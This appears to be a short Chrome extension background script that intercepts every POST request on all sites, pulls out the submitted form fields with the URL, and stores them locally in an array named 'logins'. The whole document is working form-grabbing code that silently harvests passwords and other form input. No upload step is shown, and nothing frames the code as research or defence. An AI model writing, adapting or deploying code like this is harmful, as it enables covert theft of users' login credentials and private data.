chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
      if (details.method === "POST") {
        const formData = details.requestBody && details.requestBody.formData;
        if (formData) {
          let capturedData = {
            url: details.url,
            params: {}
          };
  
          for (let key in formData) {
            capturedData.params[key] = formData[key][0]; 
          }
  
          chrome.storage.local.get({logins: []}, function(result) {
            let logins = result.logins;
            logins.push(capturedData);
            chrome.storage.local.set({logins: logins});
          });
        }
      }
    },
    { urls: ["<all_urls>"] },
    ["requestBody"]
  );
  